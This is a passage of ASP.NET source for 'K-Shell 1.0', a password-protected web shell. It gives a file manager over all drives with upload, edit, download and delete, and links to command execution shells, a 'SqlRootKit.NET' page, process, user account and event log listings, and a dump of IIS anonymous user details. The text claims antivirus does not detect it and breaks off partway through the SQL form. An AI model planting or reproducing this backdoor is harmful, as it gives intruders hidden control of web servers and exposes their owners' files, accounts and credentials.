	public sub _td&#40;&#41;
		rw&#40;"&lt;/td&gt;"&#41;
	end sub

	public sub td_span&#40;align,name,contents&#41;
		rw&#40;"&lt;td align="+align+"&gt;&lt;span id='"+name+"'&gt;"+ contents + "&lt;/span&gt;&lt;/td&gt;"&#41;
	end sub

	Public sub td_link&#40;align,title,link,target&#41;
		rw&#40;"&lt;td align="+align+"&gt;&lt;a href='"+link+"' target='"+target+"'&gt;"+title+"&lt;/a&gt;&lt;/td&gt;"&#41;
	end sub

	Public sub link&#40;title,link,target&#41;
		rw&#40;"&lt;a href='"+link+"' target='"+target+"'&gt;"+title+"&lt;/a&gt;"&#41;
	end sub

	Public sub link_hr&#40;title,link,target&#41;
		rw&#40;"&lt;a href='"+link+"' target='"+target+"'&gt;"+title+"&lt;/a&gt;"&#41;
		hr
	end sub

	Public sub link_newline&#40;title,link,target&#41;
		rw&#40;"&lt;a href='"+link+"' target='"+target+"'&gt;"+title+"&lt;/a&gt;"&#41;
		newline
	end sub
	
	public sub empty_Cell&#40;ColSpan&#41;
		rw&#40;"&lt;td colspan='"+cstr&#40;colspan&#41;+"'&gt;&lt;/td&gt;"&#41;
	end sub

	public sub empty_row&#40;ColSpan&#41;
		rw&#40;"&lt;tr&gt;&lt;td colspan='"+cstr&#40;colspan&#41;+"'&gt;&lt;/td&gt;&lt;/tr&gt;"&#41;
	end sub

       	Public sub Create_table_row_with_supplied_colors&#40;bgColor, fontColor, alignValue, rowItems&#41;
            dim rowItem

            rowItems = split&#40;rowItems,","&#41;
            response.write&#40;"&lt;tr bgcolor="+bgcolor+"&gt;"&#41;
            for each rowItem in RowItems
                response.write&#40;"&lt;td align="+alignValue+"&gt;&lt;font color="+fontColor+"&gt;&lt;b&gt;"+rowItem +"&lt;b&gt;&lt;/font&gt;&lt;/td&gt;"&#41;
            next
            response.write&#40;"&lt;/tr&gt;"&#41;

        end sub

        Public sub TR_TD&#40;cellContents&#41;
            response.write&#40;"&lt;td&gt;"&#41;
            response.write&#40;cellContents&#41;
            response.write&#40;"&lt;/td&gt;"&#41;
        end sub
	

        Public sub Surround_by_TD&#40;cellContents&#41;
            response.write&#40;"&lt;td&gt;"&#41;
            response.write&#40;cellContents&#41;
            response.write&#40;"&lt;/td&gt;"&#41;
        end sub

        Public sub Surround_by_TD_and_Bold&#40;cellContents&#41;
            response.write&#40;"&lt;td&gt;&lt;b&gt;"&#41;
            response.write&#40;cellContents&#41;
            response.write&#40;"&lt;/b&gt;&lt;/td&gt;"&#41;
        end sub

        Public sub Surround_by_TD_with_supplied_colors_and_bold&#40;bgColor, fontColor, alignValue, cellContents&#41;
            response.write&#40;"&lt;td align="+alignValue+" bgcolor="+bgcolor+" &gt;&lt;font color="+fontColor+"&gt;&lt;b&gt;"&#41;
            response.write&#40;cellContents&#41;
            response.write&#40;"&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;"&#41;
        end sub
	Public sub Create_background_Div_table&#40;title,main_cell_contents,top,left,width,height,z_index&#41;
		response.write&#40;"&lt;div style='position: absolute; top: " + top + "; left: " + left + "; width: "+width+"; height: "+height+"; z-index: "+z_index+"'&gt;"&#41;
		response.write&#40;"  &lt;table border='1' cellpadding='0' cellspacing='0' style='border-collapse: collapse' bordercolor='#111111' width='100%' id='AutoNumber1' height='100%'&gt;"&#41;
		response.write&#40;"    &lt;tr heigth=20&gt;"&#41;
		response.write&#40;"      &lt;td bgcolor='black' align=center&gt;&lt;font color='white'&gt;&lt;b&gt;"+ title +"&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;"&#41;
		response.write&#40;"    &lt;/tr&gt;"&#41;
		response.write&#40;"    &lt;tr&gt;"&#41;
		response.write&#40;"      &lt;td&gt;"+main_Cell_contents+"&lt;/td&gt;"&#41;
		response.write&#40;"    &lt;/tr&gt;"&#41;
		response.write&#40;"  &lt;/table&gt;"&#41;
		response.write&#40;"&lt;/div&gt;"&#41;
	end sub

	Public sub Create_Div_open&#40;top,left,width,height,z_index&#41;
		response.write&#40;"&lt;div style='position: absolute; top: " + top + "; left: " + left + "; width: "+width+"; height: "+height+"; z-index: "+z_index+"'&gt;"&#41;
	end sub


	Public sub Create_Div_close&#40;&#41;
		response.write&#40;"&lt;/div&gt;"&#41;
	end sub

	public sub Create_Iframe&#40;left, top, width, height, name,src&#41;
		rw&#40;"&lt;span style='position: absolute; left: " + left+ "; top: " +top + "'&gt;"&#41;  
		rw&#40;"	&lt;iframe name='" + name+ "' src='" + src+ "' width='" + cstr&#40;width&#41; + "' height='" + cstr&#40;height&#41; + "'&gt;&lt;/iframe&gt;"&#41;
    		rw&#40;"&lt;/span&gt;"&#41;
	end sub

	public sub Create_Iframe_relative&#40;width, height, name,src&#41;
		rw&#40;"	&lt;iframe name='" + name+ "' src='" + src+ "' width='" + cstr&#40;width&#41; + "' height='" + cstr&#40;height&#41; + "'&gt;&lt;/iframe&gt;"&#41;
	end sub

	public sub return_100_percent_table&#40;&#41;
		rw&#40;"&lt;table border width='100%' height='100%'&gt;&lt;tr&gt;&lt;td&gt;sdf&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;"&#41;
	end sub

	public sub font_size&#40;size&#41;
		rw&#40;"&lt;font size="+size+"&gt;"&#41;
	end sub

	public sub end_font&#40;&#41;
		rw&#40;"&lt;/font&gt;"&#41;
	end sub

	public sub red&#40;contents&#41;
		rw&#40;"&lt;font color=red&gt;"+contents+"&lt;/font&gt;"&#41;
	end sub

	public sub yellow&#40;contents&#41;
		rw&#40;"&lt;font color='#FF8800'&gt;"+contents+"&lt;/font&gt;"&#41;
	end sub

	public sub green&#40;contents&#41;
		rw&#40;"&lt;font color=green&gt;"+contents+"&lt;/font&gt;"&#41;
	end sub
	public sub print_var&#40;var_name, var_value,var_description&#41;
		if var_description&lt;&gt; "" Then
			rw&#40;b_&#40;var_name&#41;+" : " + var_value + i_&#40;"  &#40;"+var_description+"&#41;"&#41;&#41;
		else
			rw&#40;b_&#40;var_name&#41;+" : " + var_value&#41;
		end if
		newline
	end sub

' Functions

	public function br_&#40;&#41;
		br_ = "&lt;br&gt;"
	end function

	public function b_&#40;contents&#41;
		b_ = "&lt;b&gt;"+ contents + "&lt;/b&gt;"
	end function

	public function i_&#40;contents&#41;
		i_ = "&lt;i&gt;"+ contents + "&lt;/i&gt;"
	end function

	public function li_&#40;contents&#41;
		li_ = "&lt;li&gt;"+ contents + "&lt;/li&gt;"
	end function

	public function h1_&#40;contents&#41;
		h1_ = "&lt;h1&gt;"+ contents + "&lt;/h1&gt;"
	end function

	public function h2_&#40;contents&#41;
		h2_ = "&lt;h2&gt;"+ contents + "&lt;/h2&gt;"
	end function

	public function h3_&#40;contents&#41;
		h3_ = "&lt;h3&gt;"+ contents + "&lt;/h3&gt;"
	end function

	public function big_&#40;contents&#41;
		big_ = "&lt;big&gt;"+ contents + "&lt;/big&gt;"
	end function

	public function center_&#40;contents&#41;
		center_ = "&lt;center&gt;"+ cstr&#40;contents&#41; + "&lt;/center&gt;"
	end function


	public function td_force_width_&#40;width&#41;
		td_force_width_ = "&lt;br&gt;&lt;img src='' height=0 width=" + cstr&#40;width&#41; +  " border=0&gt;"
	end function


	public function red_&#40;contents&#41;
		red_ = "&lt;font color=red&gt;"+contents+"&lt;/font&gt;"
	end function

	public function yellow_&#40;contents&#41;
		yellow_ = "&lt;font color='#FF8800'&gt;"+contents+"&lt;/font&gt;"
	end function

	public function green_&#40;contents&#41;
		green_ = "&lt;font color=green&gt;"+contents+"&lt;/font&gt;"
	end function

	Public function link_&#40;title,link,target&#41;
		link_ = "&lt;a href='"+link+"' target='"+target+"'&gt;"+title+"&lt;/a&gt;"
	end function
'End HTML SNIPPETS	
&lt;/script&gt;
&lt;%
if request.QueryString&#40;"action"&#41;="down" and session&#40;"kikicoco"&#41;=1 then
		downTheFile&#40;request.QueryString&#40;"src"&#41;&#41;
		response.End&#40;&#41;
end if
Dim hu as string = request.QueryString&#40;"action"&#41;
if hu="cmd" then 
TITLE="CMD.NET"
elseif hu="cmdw32" then 
TITLE="ASP.NET W32 Shell"
elseif hu="cmdwsh" then 
TITLE="ASP.NET WSH Shell"
elseif hu="sqlrootkit" then 
TITLE="SqlRootKit.NET"
elseif hu="clonetime" then 
TITLE="Clone Time"
elseif hu="information" then 
TITLE="Web Server Info"
elseif hu="goto" then 
TITLE="K-Shell 1.0"
elseif hu="pro" then 
TITLE="List processes from server"
elseif hu="user" then 
TITLE="List User Accounts"
elseif hu="applog" then 
TITLE="List Application Event Log Entries"
elseif hu="syslog" then 
TITLE="List System Event Log Entries"
elseif hu="auser" then 
TITLE="IIS List Anonymous' User details"
else 
TITLE=request.ServerVariables&#40;"HTTP_HOST"&#41; 
end if
%&gt;
&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"&gt;
&lt;html&gt;
&lt;style type="text/css"&gt;
body,td,th {
	color: #000000;
	font-family: Verdana;
}
body {
	background-color: #ffffff;
	font-size:12px; 
}
.buttom {color: #FFFFFF; border: 1px solid #084B8E; background-color: #719BC5}
.TextBox {border: 1px solid #084B8E}
.style3 {color: #FF0000}
&lt;/style&gt;
&lt;head&gt;
&lt;meta http-equiv="Content-Type" content="text/html"&gt;
&lt;title&gt;&lt;%=TITLE%&gt;&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;div align="center"&gt;K-Shell 1.0 By &lt;a href="" target="_blank" title="Welcome to my page:&#41;"&gt;kikicoco&lt;/a&gt; from Vietnam &#91;&lt;a href="" target="_blank"&gt;VN&lt;/a&gt;&#93;&lt;/div&gt;
&lt;hr&gt;
&lt;%
Dim error_x as Exception
Try
if session&#40;"kikicoco"&#41;&lt;&gt;1 then
	'response.Write&#40;"&lt;br&gt;"&#41;
	'response.Write&#40;"Hello , thank you for using my program !&lt;br&gt;"&#41;
	'response.Write&#40;"This program is run at ASP.NET Environment and manage the web directory.&lt;br&gt;"&#41;
	'response.Write&#40;"Maybe this program looks like a backdoor , but I wish you like it and don't hack :p&lt;br&gt;&lt;br&gt;"&#41;
	'response.Write&#40;"&lt;span class=""style3""&gt;Notice:&lt;/span&gt; only click ""Login"" to login."&#41;
%&gt;
&lt;form runat="server"&gt;
  Your Password:&lt;asp:TextBox ID="TextBox" runat="server"  TextMode="Password" class="TextBox" /&gt;  
  &lt;asp:Button  ID="Button" runat="server" Text="Login" ToolTip="Click here to login"  OnClick="login_click" class="buttom" /&gt;
&lt;/form&gt; 
&lt;%
else
	dim temp as string
	temp=request.QueryString&#40;"action"&#41;
	if temp="" then temp="goto"
	select case temp
	case "goto"
		if request.QueryString&#40;"src"&#41;&lt;&gt;"" then
			url=request.QueryString&#40;"src"&#41;
		else
			url=server.MapPath&#40;"."&#41; & "\"
		end if
	call existdir&#40;url&#41;
	dim xdir as directoryinfo
	dim mydir as new DirectoryInfo&#40;url&#41;
	dim hupo as string
	dim xfile as fileinfo
%&gt;
&lt;table width="90%"  border="0" align="center"&gt;
  &lt;tr&gt;
  	&lt;td&gt;Currently Dir:&lt;/td&gt; &lt;td&gt;&lt;font color=red&gt;&lt;%=url%&gt;&lt;/font&gt;&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td width="13%"&gt;Operate:&lt;/td&gt;
    &lt;td width="87%"&gt;&lt;a href="?action=new&src=&lt;%=server.UrlEncode&#40;url&#41;%&gt;" title="New file or directory"&gt;New&lt;/a&gt; - 
      &lt;%if session&#40;"cutboard"&#41;&lt;&gt;"" then%&gt;
      &lt;a href="?action=plaster&src=&lt;%=server.UrlEncode&#40;url&#41;%&gt;" title="you can plaster"&gt;Paste&lt;/a&gt; - 
      &lt;%else%&gt;
	Paste - 
&lt;%end if%&gt;
&lt;a href="?action=upfile&src=&lt;%=server.UrlEncode&#40;url&#41;%&gt;" title="Upload file"&gt;UpLoad&lt;/a&gt; - &lt;a href="?action=goto&src=" & &lt;%=server.MapPath&#40;"."&#41;%&gt; title="Go to this file's directory"&gt;GoBackDir &lt;/a&gt; - &lt;a href="?action=logout" title="Exit"&gt;Quit&lt;/a&gt;&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;
	Go to: &lt;/td&gt;
    &lt;td&gt;
&lt;%
dim i as integer
for i =0 to Directory.GetLogicalDrives&#40;&#41;.length-1
 	response.Write&#40;"&lt;a href='?action=goto&src=" & Directory.GetLogicalDrives&#40;i&#41; & "'&gt;" & Directory.GetLogicalDrives&#40;i&#41; & " &lt;/a&gt;"&#41;
next
%&gt;
&lt;/td&gt;
  &lt;/tr&gt;

  &lt;tr&gt;
    &lt;td&gt;Tool:&lt;/td&gt;
    &lt;td&gt;&lt;a href="?action=sqlrootkit" &gt;SqlRootKit.NET &lt;/a&gt; - &lt;a href="?action=cmd" &gt;CMD.NET&lt;/a&gt; - &lt;a href="?action=cmdw32" &gt;kshellW32&lt;/a&gt; - &lt;a href="?action=cmdwsh" &gt;kshellWSH&lt;/a&gt; - &lt;a href="?action=clonetime&src=&lt;%=server.UrlEncode&#40;url&#41;%&gt;" &gt;CloneTime&lt;/a&gt; - &lt;a href="?action=information" &gt;System Info&lt;/a&gt; - &lt;a href="?action=pro" &gt;List Processes&lt;/a&gt;&lt;/td&gt;    
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt; &lt;/td&gt;
    &lt;td&gt;&lt;a href="?action=applog" &gt;Application Event Log &lt;/a&gt; - &lt;a href="?action=user" &gt;List User Accounts&lt;/a&gt; - &lt;a href="?action=syslog" &gt;System Log&lt;/a&gt; - &lt;a href="?action=auser" &gt;IIS List Anonymous' User details&lt;/a&gt;&lt;/td&gt;    
  &lt;/tr&gt;
&lt;/table&gt;
&lt;hr&gt;
&lt;table width="90%"  border="0" align="center"&gt;
	&lt;tr&gt;
	&lt;td width="40%"&gt;&lt;strong&gt;Name&lt;/strong&gt;&lt;/td&gt;
	&lt;td width="15%"&gt;&lt;strong&gt;Size&lt;/strong&gt;&lt;/td&gt;
	&lt;td width="20%"&gt;&lt;strong&gt;ModifyTime&lt;/strong&gt;&lt;/td&gt;
	&lt;td width="25%"&gt;&lt;strong&gt;Operate&lt;/strong&gt;&lt;/td&gt;
	&lt;/tr&gt;
      &lt;tr&gt;
        &lt;td&gt;&lt;%
		hupo= "&lt;tr&gt;&lt;td&gt;&lt;a href='?action=goto&src=" & server.UrlEncode&#40;Getparentdir&#40;url&#41;&#41; & "'&gt;&lt;i&gt;|Parent Directory|&lt;/i&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;"
		response.Write&#40;hupo&#41;
		for each xdir in mydir.getdirectories&#40;&#41;
			response.Write&#40;"&lt;tr&gt;"&#41;
			dim filepath as string 
			filepath=server.UrlEncode&#40;url & xdir.name&#41;
			hupo= "&lt;td&gt;&lt;a href='?action=goto&src=" & filepath & "\" & "'&gt;" & xdir.name & "&lt;/a&gt;&lt;/td&gt;"
			response.Write&#40;hupo&#41;
			response.Write&#40;"&lt;td&gt;&lt;dir&gt;&lt;/td&gt;"&#41;
			response.Write&#40;"&lt;td&gt;" & Directory.GetLastWriteTime&#40;url & xdir.name&#41; & "&lt;/td&gt;"&#41;
			hupo="&lt;td&gt;&lt;a href='?action=cut&src=" & filepath & "\'  target='_blank'&gt;Cut" & "&lt;/a&gt;|&lt;a href='?action=copy&src=" & filepath & "\'  target='_blank'&gt;Copy&lt;/a&gt;|&lt;a href='?action=del&src=" & filepath & "\'" & " onclick='return del&#40;this&#41;;'&gt;Del&lt;/a&gt;&lt;/td&gt;"
			response.Write&#40;hupo&#41;
			response.Write&#40;"&lt;/tr&gt;"&#41;
		next
		%&gt;&lt;/td&gt;
  &lt;/tr&gt;
		&lt;tr&gt;
        &lt;td&gt;&lt;%
		for each xfile in mydir.getfiles&#40;&#41;
			dim filepath2 as string
			filepath2=server.UrlEncode&#40;url & xfile.name&#41;
			response.Write&#40;"&lt;tr&gt;"&#41;
			hupo="&lt;td&gt;" & xfile.name & "&lt;/td&gt;"
			response.Write&#40;hupo&#41;
			hupo="&lt;td&gt;" & GetSize&#40;xfile.length&#41; & "&lt;/td&gt;"
			response.Write&#40;hupo&#41;
			response.Write&#40;"&lt;td&gt;" & file.GetLastWriteTime&#40;url & xfile.name&#41; & "&lt;/td&gt;"&#41;
			hupo="&lt;td&gt;&lt;a href='?action=edit&src=" & filepath2 & "'&gt;Edit&lt;/a&gt;|&lt;a href='?action=cut&src=" & filepath2 & "' target='_blank'&gt;Cut&lt;/a&gt;|&lt;a href='?action=copy&src=" & filepath2 & "' target='_blank'&gt;Copy&lt;/a&gt;|&lt;a href='?action=rename&src=" & filepath2 & "'&gt;Rename&lt;/a&gt;|&lt;a href='?action=down&src=" & filepath2 & "' onClick='return down&#40;this&#41;;'&gt;Download&lt;/a&gt;|&lt;a href='?action=del&src=" & filepath2 & "' onClick='return del&#40;this&#41;;'&gt;Del&lt;/a&gt;&lt;/td&gt;"			
			response.Write&#40;hupo&#41;
			response.Write&#40;"&lt;/tr&gt;"&#41;
		next
		response.Write&#40;"&lt;/table&gt;"&#41;
		%&gt;&lt;/td&gt;
      &lt;/tr&gt;
&lt;/table&gt;
&lt;script language="javascript"&gt;
function del&#40;&#41;
{
if&#40;confirm&#40;"Are you sure?"&#41;&#41;{return true;}
else{return false;}
}
function down&#40;&#41;
{
if&#40;confirm&#40;"If the file size &gt; 20M,\nPlease don\'t download\nYou can copy file to web directory ,use http download\nAre you sure download?"&#41;&#41;{return true;}
else{return false;}
}
&lt;/script&gt;
&lt;%
case "information"
	dim CIP,CP as string
	if getIP&#40;&#41;&lt;&gt;request.ServerVariables&#40;"REMOTE_ADDR"&#41; then
			CIP=getIP&#40;&#41;
			CP=request.ServerVariables&#40;"REMOTE_ADDR"&#41;
	else
			CIP=request.ServerVariables&#40;"REMOTE_ADDR"&#41;
			CP="None"
	end if
%&gt;
&lt;div align=center&gt;&#91; Web Server Information &#93;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;i&gt;&lt;a href="javascript:history.back&#40;1&#41;;"&gt;Back&lt;/a&gt;&lt;/i&gt;&lt;/div&gt;&lt;br&gt;
&lt;table width="80%"  border="1" align="center"&gt;
  &lt;tr&gt;
    &lt;td width="40%"&gt;Server IP&lt;/td&gt;
    &lt;td width="60%"&gt;&lt;%=request.ServerVariables&#40;"LOCAL_ADDR"&#41;%&gt;&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td height="73"&gt;Machine Name&lt;/td&gt;
    &lt;td&gt;&lt;%=Environment.MachineName%&gt;&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;Network Name&lt;/td&gt;
    &lt;td&gt;&lt;%=Environment.UserDomainName.ToString&#40;&#41;%&gt;&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;User Name in this Process&lt;/td&gt;
    &lt;td&gt;&lt;%=Environment.UserName%&gt;&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;OS Version&lt;/td&gt;
    &lt;td&gt;&lt;%=Environment.OSVersion.ToString&#40;&#41;%&gt;&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;Started Time&lt;/td&gt;
    &lt;td&gt;&lt;%=GetStartedTime&#40;Environment.Tickcount&#41;%&gt; Hours&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;System Time&lt;/td&gt;
    &lt;td&gt;&lt;%=now%&gt;&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;IIS Version&lt;/td&gt;
    &lt;td&gt;&lt;%=request.ServerVariables&#40;"SERVER_SOFTWARE"&#41;%&gt;&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;HTTPS&lt;/td&gt;
    &lt;td&gt;&lt;%=request.ServerVariables&#40;"HTTPS"&#41;%&gt;&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;PATH_INFO&lt;/td&gt;
    &lt;td&gt;&lt;%=request.ServerVariables&#40;"PATH_INFO"&#41;%&gt;&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;PATH_TRANSLATED&lt;/td&gt;
    &lt;td&gt;&lt;%=request.ServerVariables&#40;"PATH_TRANSLATED"&#41;%&gt;&lt;/td&gt;
  &lt;tr&gt;
    &lt;td&gt;SERVER_PORT&lt;/td&gt;
    &lt;td&gt;&lt;%=request.ServerVariables&#40;"SERVER_PORT"&#41;%&gt;&lt;/td&gt;
  &lt;/tr&gt;
    &lt;tr&gt;
    &lt;td&gt;SeesionID&lt;/td&gt;
    &lt;td&gt;&lt;%=Session.SessionID%&gt;&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td colspan="2"&gt;&lt;span class="style3"&gt;Client Infomation&lt;/span&gt;&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;Client Proxy&lt;/td&gt;
    &lt;td&gt;&lt;%=CP%&gt;&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;Client IP&lt;/td&gt;
    &lt;td&gt;&lt;%=CIP%&gt;&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;User&lt;/td&gt;
    &lt;td&gt;&lt;%=request.ServerVariables&#40;"HTTP_USER_AGENT"&#41;%&gt;&lt;/td&gt;
  &lt;/tr&gt;
&lt;/table&gt;
&lt;table align=center&gt;
	&lt;% Create_table_row_with_supplied_colors&#40;"Black", "White", "center", "Environment Variables, Server Variables"&#41; %&gt;
	&lt;tr&gt;
		&lt;td&gt;&lt;textArea cols=50 rows=10&gt;&lt;% output_all_environment_variables&#40;"text"&#41; %&gt;&lt;/textarea&gt;&lt;/td&gt;
		&lt;td&gt;&lt;textArea cols=50 rows=10&gt;&lt;% output_all_Server_variables&#40;"text"&#41; %&gt;&lt;/textarea&gt;&lt;/td&gt;
	&lt;/tr&gt;
&lt;/table&gt;
&lt;%
	case "cmd"
%&gt;
&lt;form runat="server"&gt;
  &lt;p&gt;&#91; CMD.NET for WebAdmin &#93;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;i&gt;&lt;a href="javascript:history.back&#40;1&#41;;"&gt;Back&lt;/a&gt;&lt;/i&gt;&lt;/p&gt;
  &lt;p&gt; Execute command with ASP.NET account&#40;&lt;span class="style3"&gt;Notice: only click &quot;Run&quot; to run&lt;/span&gt;&#41;&lt;/p&gt;
  &lt;p&gt;- This function has fixed by kikicoco.Antivirus has not detected &#40;2007/02/27&#41;-&lt;/p&gt;
  Command:
  &lt;asp:TextBox ID="cmd" runat="server" Width="300" class="TextBox" /&gt;
  &lt;asp:Button ID="Button123" runat="server" Text="Run" OnClick="RunCMD" class="buttom"/&gt;  
  &lt;p&gt;
   &lt;asp:Label ID="result" runat="server" style="style2"/&gt;      &lt;/p&gt;
&lt;/form&gt;
&lt;%
	case "cmdw32"
%&gt;
&lt;form runat="server"&gt;
	&lt;p&gt;&#91; ASP.NET W32 Shell &#93;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;i&gt;&lt;a href="javascript:history.back&#40;1&#41;;"&gt;Back&lt;/a&gt;&lt;/i&gt;&lt;/p&gt;
  	&lt;p&gt; Execute command with ASP.NET account using W32&#40;&lt;span class="style3"&gt;Notice: only click &quot;Run&quot; to run&lt;/span&gt;&#41;&lt;/p&gt;
  	Command:
	&lt;asp:TextBox ID="txtCommand1" runat="server" style="border: 1px solid #084B8E"/&gt;
  	&lt;asp:Button ID="Buttoncmdw32" runat="server" Text="Run" OnClick="RunCmdW32" style="color: #FFFFFF; border: 1px solid #084B8E; background-color: #719BC5"/&gt;  
  	&lt;p&gt;
    &lt;asp:Label ID="resultcmdw32" runat="server" style="color: #0000FF"/&gt;      
    &lt;/p&gt;
&lt;/form&gt;
&lt;%
	case "cmdwsh"
%&gt;
&lt;form runat="server"&gt;
	&lt;p&gt;&#91; ASP.NET WSH Shell &#93;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;i&gt;&lt;a href="javascript:history.back&#40;1&#41;;"&gt;Back&lt;/a&gt;&lt;/i&gt;&lt;/p&gt;
  	&lt;p&gt; Execute command with ASP.NET account using WSH&#40;&lt;span class="style3"&gt;Notice: only click &quot;Run&quot; to run&lt;/span&gt;&#41;&lt;/p&gt;
  	Command:
	&lt;asp:TextBox ID="txtCommand2" runat="server" style="border: 1px solid #084B8E"/&gt;
  	&lt;asp:Button ID="Buttoncmdwsh" runat="server" Text="Run" OnClick="RunCmdWSH" style="color: #FFFFFF; border: 1px solid #084B8E; background-color: #719BC5"/&gt;  
  	&lt;p&gt;
    &lt;asp:Label ID="resultcmdwsh" runat="server" style="color: #0000FF"/&gt;      
    &lt;/p&gt;
&lt;/form&gt;
&lt;%
	case "pro"
%&gt;
&lt;form runat="server"&gt;
	&lt;p align=center&gt;&#91; List processes from server &#93;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;i&gt;&lt;a href="javascript:history.back&#40;1&#41;;"&gt;Back&lt;/a&gt;&lt;/i&gt;&lt;/p&gt;
	&lt;table align=center&gt;
		&lt;tr&gt;
			&lt;td&gt;
			&lt;% 
				Try
				output_wmi_function_data&#40;"Win32_Process","Name,ProcessId,HandleCount"&#41;
				Catch
				rw&#40;"This function is disabled by server"&#41;
				End Try
			%&gt;
			&lt;/td&gt;
		&lt;/tr&gt;
	&lt;/table&gt;
&lt;/form&gt;
&lt;%
	case "user"
%&gt;
&lt;form runat="server"&gt;
	&lt;p align=center&gt;&#91; List User Accounts &#93;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;i&gt;&lt;a href="javascript:history.back&#40;1&#41;;"&gt;Back&lt;/a&gt;&lt;/i&gt;&lt;/p&gt;
	&lt;table align=center&gt;
		&lt;tr&gt;
			&lt;td&gt;
			&lt;% 
				dim WMI_function = "Win32_UserAccount"		
				dim Fields_to_load = "Name,Domain,FullName,Description,SID"
				dim fail_description = " Access to " + WMI_function + " is protected"
				Try
				output_wmi_function_data&#40;WMI_function,Fields_to_load&#41;
				Catch
				rw&#40;fail_description&#41;
				End Try
			%&gt;
			&lt;/td&gt;
		&lt;/tr&gt;
	&lt;/table&gt;
&lt;/form&gt;
&lt;%
	case "applog"
%&gt;
&lt;form runat="server"&gt;
	&lt;p align=center&gt;&#91; List Application Event Log Entries &#93;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;i&gt;&lt;a href="javascript:history.back&#40;1&#41;;"&gt;Back&lt;/a&gt;&lt;/i&gt;&lt;/p&gt;
	&lt;table align=center&gt;
		&lt;tr&gt;
			&lt;td&gt;
			&lt;% 
				dim WMI_function = "Win32_NTLogEvent where Logfile='Application'"		
				dim Fields_to_load = "Logfile,Message,type"
				dim fail_description = " Access to " + WMI_function + " is protected"
				Try
				output_wmi_function_data_instances&#40;WMI_function,Fields_to_load,2000&#41;
				Catch
				rw&#40;fail_description&#41;
				End Try
			%&gt;
			&lt;/td&gt;
		&lt;/tr&gt;
	&lt;/table&gt;
&lt;/form&gt;
&lt;%
	case "syslog"
%&gt;
&lt;form runat="server"&gt;
	&lt;p align=center&gt;&#91; List System Event Log Entries &#93;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;i&gt;&lt;a href="javascript:history.back&#40;1&#41;;"&gt;Back&lt;/a&gt;&lt;/i&gt;&lt;/p&gt;
	&lt;table align=center&gt;
		&lt;tr&gt;
			&lt;td&gt;
			&lt;% 
				dim WMI_function = "Win32_NTLogEvent where Logfile='System'"		
				dim Fields_to_load = "Logfile,Message,type"
				dim fail_description = " Access to " + WMI_function + " is protected"
				
				Try
				output_wmi_function_data_instances&#40;WMI_function,Fields_to_load,2000&#41;
				Catch
				rw&#40;"This function is disabled by server"&#41;
				End Try
			%&gt;
			&lt;/td&gt;
		&lt;/tr&gt;
	&lt;/table&gt;
&lt;/form&gt;
&lt;%
	case "auser"
%&gt;
&lt;form runat="server"&gt;
	&lt;p align=center&gt;&#91; IIS List Anonymous' User details &#93;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;i&gt;&lt;a href="javascript:history.back&#40;1&#41;;"&gt;Back&lt;/a&gt;&lt;/i&gt;&lt;/p&gt;
	&lt;table align=center&gt;
		&lt;tr&gt;
			&lt;td&gt;
			&lt;% 
				Try
				IIS_list_Anon_Name_Pass
				Catch
				rw&#40;"This function is disabled by server"&#41;
				End Try
			%&gt;
			&lt;/td&gt;
		&lt;/tr&gt;
	&lt;/table&gt;
&lt;/form&gt;
&lt;%
	case "sqlrootkit"
%&gt;
&lt;form runat="server"&gt;
  &lt;p&gt;&#91; SqlRootKit.NET for WebAdmin &#93;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;i&gt;&lt;a href="javascript:history.back&#40;1&#41;;"&gt;Back&lt;/a&gt;&lt;/i&gt;&lt;/p&gt;
  &lt;p&gt; Execute command with SQLServer account&#40;&lt;span class="style3"&gt;Notice: only click "Run" to run&lt;/span&gt;&#41;&lt;/p&gt;
  &lt;p&gt;Host:
